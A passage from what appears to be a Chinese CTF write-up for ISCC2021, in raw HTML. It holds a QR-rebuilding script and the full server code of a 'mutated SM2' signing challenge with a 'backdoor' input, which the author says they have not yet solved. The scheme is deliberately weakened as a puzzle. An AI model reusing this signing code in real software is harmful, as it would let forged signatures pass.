class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">841</span>,<span class="hljs-number">841</span>,<span class="hljs-number">841</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>扫码得到flag</p><h3 id="变异的SM2"><a href="#变异的SM2" class="headerlink" title="变异的SM2"></a>变异的SM2</h3><p>附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#server.py</span><br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> func, sm2<br><span class="hljs-comment"># from flag import FLAG</span><br>FLAG=<span class="hljs-string">&quot;&#123;testFlag&#125;&quot;</span><br><br>sm2p256v1_ecc_table = &#123;<br>    <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> +<br>         <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,<br>&#125;<br>n = <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span><br>G = <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> \<br>    <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign</span>(<span class="hljs-params">tsm2</span>):</span><br>    data = func.random_hex(<span class="hljs-built_in">len</span>(n)) <br>    k1_str = func.random_hex(<span class="hljs-built_in">len</span>(n))<br>    print(tsm2.send_p1(data, k1_str))<br>    backdoor = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;backdoor:&#x27;</span>).strip()<br>    result = tsm2.output_p1(k1_str, backdoor)<br>    print(result)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">tsm2</span>):</span><br>    message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;msg:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    sign = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;sign:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    check = tsm2.verify(sign, message)<br>    <span class="hljs-keyword">if</span> check <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> message == <span class="hljs-string">b&#x27;Hello, Welcome to ISCC2021!&#x27;</span>:<br>        print(FLAG)<br>    <span class="hljs-keyword">else</span>:<br>        print(check)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TSM2</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, sk</span>):</span><br>        ecc_table = sm2p256v1_ecc_table<br>        self.ecc_table = ecc_table<br>        self.n = <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-number">16</span>)<br>        self.para_len = <span class="hljs-built_in">len</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>])<br>        self.ecc_a3 = (<span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;a&#x27;</span>], base=<span class="hljs-number">16</span>) + <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>        self.sk = <span class="hljs-built_in">int</span>(sk, <span class="hljs-number">16</span>)<br>        self.pk = self._kg(self.sk, ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        <br>        self.sks = <span class="hljs-built_in">int</span>(func.random_hex(self.para_len), <span class="hljs-number">16</span>)<br>        self.pks = <span class="hljs-built_in">pow</span>((self.sk + <span class="hljs-number">1</span>) * self.sks, self.n - <span class="hljs-number">2</span>, self.n) % self.n<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_p1</span>(<span class="hljs-params">self, data, k1_str</span>):</span><br>        e = <span class="hljs-built_in">int</span>(data, <span class="hljs-number">16</span>)<br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        k1 = k1 % self.n<br>        R1 = self._kg(k1, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>]) <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%0128s&#x27;</span> % (e, R1) <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">output_p1</span>(<span class="hljs-params">self, k1_str, r_s2_s3</span>):</span><br>        r = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s2 = <span class="hljs-built_in">int</span>(r_s2_s3[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        s3 = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">2</span> * self.para_len:], <span class="hljs-number">16</span>)<br><br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        d1 = self.sks<br>        s = (d1 * k1 * s2 + d1 * s3 - r) % self.n <br>        <span class="hljs-keyword">if</span> s == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> s == (self.n - r):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%064x&#x27;</span> % (r, s)  <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">self, Sign, data</span>):</span><br>        r = <span class="hljs-built_in">int</span>(Sign[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s = <span class="hljs-built_in">int</span>(Sign[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        e = <span class="hljs-built_in">int</span>(data.<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br>        t = (r + s) % self.n<br>        <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>        P1 = self._kg(s, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        P2 = self._kg(t, self.pk)<br><br>        <span class="hljs-keyword">if</span> P1 == P2:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._double_point(P1)<br>        <span class="hljs-keyword">else</span>:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._add_point(P1, P2)<br>            P1 = self._convert_jacb_to_nor(P1)<br><br>        x = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> r == ((e + x) % self.n)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_kg</span>(<span class="hljs-params">self, k, Point</span>):</span> <br>        <span class="hljs-keyword">if</span> (k % self.n) == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span><br>        Point = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (Point, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        mask_str = <span class="hljs-string">&#x27;8&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len - <span class="hljs-number">1</span>):<br>            mask_str += <span class="hljs-string">&#x27;0&#x27;</span><br>        mask = <span class="hljs-built_in">int</span>(mask_str, <span class="hljs-number">16</span>)<br>        Temp = Point<br>        flag = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len * <span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">if</span> flag:<br>                Temp = self._double_point(Temp)<br>            <span class="hljs-keyword">if</span> (k &amp; mask) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> flag:<br>                    Temp = self._add_point(Temp, Point)<br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-literal">True</span><br>                    Temp = Point<br>            k = k &lt;&lt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> self._convert_jacb_to_nor(Temp)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_double_point</span>(<span class="hljs-params">self, Point</span>):</span> <br>        l = <span class="hljs-built_in">len</span>(Point)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        <span class="hljs-keyword">if</span> l &lt; self.para_len * <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            x1 = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y1 = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l == len_2:<br>                z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                z1 = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br><br>            T6 = (z1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y1 * y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (x1 - T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (y1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * <span class="hljs-number">8</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (x1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (T6 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (self.ecc_a3 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            z3 = (T3 + T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            x3 = (T3 - T5) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            <span class="hljs-keyword">if</span> (T5 % <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>:<br>                T4 = (T5 + ((T5 + <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)) &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">else</span>:<br>                T4 = (T5 + (T5 &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            T1 = (T1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (x3, y3, z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_add_point</span>(<span class="hljs-params">self, P1, P2</span>):</span> <br>        <span class="hljs-keyword">if</span> P1 == <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P2, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        <span class="hljs-keyword">if</span> P2 == <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        l1 = <span class="hljs-built_in">len</span>(P1)<br>        l2 = <span class="hljs-built_in">len</span>(P2)<br>        <span class="hljs-keyword">if</span> (l1 &lt; len_2) <span class="hljs-keyword">or</span> (l2 &lt; len_2):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            X1 = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            Y1 = <span class="hljs-built_in">int</span>(P1[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l1 == len_2:<br>                Z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                Z1 = <span class="hljs-built_in">int</span>(P1[len_2:], <span class="hljs-number">16</span>)<br>            x2 = <span class="hljs-built_in">int</span>(P2[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y2 = <span class="hljs-built_in">int</span>(P2[self.para_len:len_2], <span class="hljs-number">16</span>)<br><br>            T1 = (Z1 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y2 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x2 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T3 - X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 + X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 - Y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Z3 = (Z1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (X1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            X3 = (T5 - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (Y1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T4 - X3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (X3, Y3, Z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_convert_jacb_to_nor</span>(<span class="hljs-params">self, Point</span>):</span> <br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        x = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        y = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>        z = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br>        z_inv = <span class="hljs-built_in">pow</span>(z, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>) - <span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>))<br>        z_invSquar = (z_inv * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_invQube = (z_invSquar * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        x_new = (x * z_invSquar) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        y_new = (y * z_invQube) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_new = (z * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> z_new == <span class="hljs-number">1</span>:<br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">2</span><br>            <span class="hljs-keyword">return</span> form % (x_new, y_new)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sk = func.random_hex(<span class="hljs-built_in">len</span>(sm2p256v1_ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>]))<br>    tsm2 = TSM2(sk)<br>    print(<span class="hljs-string">&#x27;pk:%s&#x27;</span>   %tsm2.pk)<br>    print(<span class="hljs-string">&#x27;pks:%064x&#x27;</span>%tsm2.pks)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        op = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;op: &#x27;</span>).strip()<br>        <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;sign&#x27;</span>:<br>            sign(tsm2)<br>        <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;verify&#x27;</span>:<br>            verify(tsm2)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;&quot;&quot;sign: sign message</span><br><span class="hljs-string">verify: verify message&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>暂时没做出来</p><h3 id="混乱的音频"><a href="#混乱的音频" class="headerlink" 